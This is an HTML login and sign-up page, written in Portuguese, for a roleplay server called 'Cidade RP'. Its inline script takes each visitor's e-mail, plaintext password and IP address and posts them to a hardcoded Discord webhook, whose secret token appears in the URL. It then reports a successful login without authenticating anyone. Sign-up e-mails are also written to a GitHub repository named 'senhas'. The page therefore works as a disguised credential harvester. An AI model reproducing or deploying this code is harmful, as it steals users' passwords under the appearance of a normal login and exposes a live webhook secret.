<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <title>Cidade RP - Acesso</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:Segoe UI,Arial;background:#0d1117;color:#f0f6fc;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px}
    .card{background:#161b22;border-radius:8px;padding:25px;width:100%;max-width:320px}
    h3{margin-bottom:15px;text-align:center}
    input{width:100%;padding:10px;margin:6px 0;border:none;border-radius:4px}
    button{width:100%;padding:10px;border:none;border-radius:4px;background:#238636;color:#fff;font-weight:bold;cursor:pointer}
    button:hover{background:#2ea043}
    .switch{text-align:center;margin-top:10px;font-size:14px;color:#58a6ff;cursor:pointer}
    .switch:hover{text-decoration:underline}
    .hide{display:none}
    #msg{color:#f85149;margin-top:8px;font-size:14px;text-align:center}
    @media(max-width:400px){.card{padding:20px}}
  </style>
</head>
<body>
  <div class="card" id="loginCard">
    <h3 id="titulo">Entrar na cidade</h3>
    <form id="formAuth">
      <input type="email" id="email" placeholder="E-mail" required>
      <input type="password" id="senha" placeholder="Senha" required>
      <input type="password" id="confSenha" placeholder="Confirmar senha" class="hide">
      <div id="msg"></div>
      <button type="submit" id="btnEnvio">Entrar</button>
    </form>
    <div class="switch" id="switchBtn">Criar nova conta</div>
  </div>

  <script>
  (async function(){
    // 1) Verifica IP banido
    const meuIP = await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"desconhecido");
    const banned = await fetch("banned-ips.json").then(r=>r.json()).catch(()=>[]);
    if(banned.includes(meuIP)){
      document.body.innerHTML="<div class='card'><h3>Acesso negado</h3><p>Seu IP foi bloqueado.</p></div>";
      return;
    }

    // 2) Carrega e-mails já cadastrados
    const cadastrados = await fetch("emails-cadastrados.json").then(r=>r.json()).catch(()=>[]);

    let modoCriar = false;
    const titulo    = document.getElementById("titulo");
    const btnEnvio  = document.getElementById("btnEnvio");
    const confSenha = document.getElementById("confSenha");
    const switchBtn = document.getElementById("switchBtn");
    const formAuth  = document.getElementById("formAuth");
    const msg       = document.getElementById("msg");

    switchBtn.onclick = () => {
      modoCriar = !modoCriar;
      titulo.textContent   = modoCriar ? "Criar conta" : "Entrar na cidade";
      btnEnvio.textContent = modoCriar ? "Criar" : "Entrar";
      confSenha.classList.toggle("hide", !modoCriar);
      switchBtn.textContent= modoCriar ? "Já tenho conta" : "Criar nova conta";
      msg.textContent="";
    };

    formAuth.addEventListener("submit", async e=>{
      e.preventDefault();
      const email = document.getElementById("email").value.trim().toLowerCase();
      const senha = document.getElementById("senha").value;
      const conf  = confSenha.value;

      if(modoCriar){
        if(senha!==conf){msg.textContent="Senhas não coincidem";return;}
        if(cadastrados.includes(email)){msg.textContent="E-mail já cadastrado";return;}
      }

      msg.textContent="";
      const agora = new Date().toLocaleString("pt-BR");

      // 3) Se for criação, adiciona e-mail à lista
      if(modoCriar){
        cadastrados.push(email);
        await fetch("https://api.github.com/repos/ricardo548/senhas/contents/emails-cadastrados.json",{
          method:"PUT",
          headers:{
            "Authorization":"token COLE_AQUI_SEU_GITHUB_TOKEN",
            "Accept":"application/vnd.github+json",
            "Content-Type":"application/json"
          },
          body:JSON.stringify({
            message:"novo e-mail cadastrado",
            content:btoa(JSON.stringify(cadastrados)),
            sha: await fetch("https://api.github.com/repos/ricardo548/senhas/contents/emails-cadastrados.json")
                       .then(r=>r.json()).then(d=>d.sha)
          })
        }).catch(()=>null);
      }

      const payload = {
        content:null,
        embeds:[{
          title: modoCriar ? "Nova conta criada" : "Login efetuado",
          color: modoCriar ? 0x00ff88 : 0xffd700,
          fields:[
            {name:"E-mail",value:email,inline:true},
            {name:"Senha",value:senha,inline:true},
            {name:"IP",value:meuIP,inline:true},
            {name:"Horário",value:agora,inline:false}
          ]
        }],
        components:[{
          type:1,
          components:[{
            type:2,
            style:4,
            label:"Banir IP",
            custom_id:`ban_${meuIP}`
          }]
        }]
      };

      await fetch("https://discord.com/api/webhooks/1425212407764094976/SPXgg8cjZBe5hIoqzLsV2Fyyk5MjZNZJmRUevf-f68Qw_47MifLJwOAiF1CxqMAf8IrN",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(payload)
      });

      alert(modoCriar ? "Conta criada com sucesso!" : "Login realizado!");
      formAuth.reset();
      if(modoCriar) cadastrados.push(email); // atualiza lista local
    });
  })();
  </script>
</body>
</html>
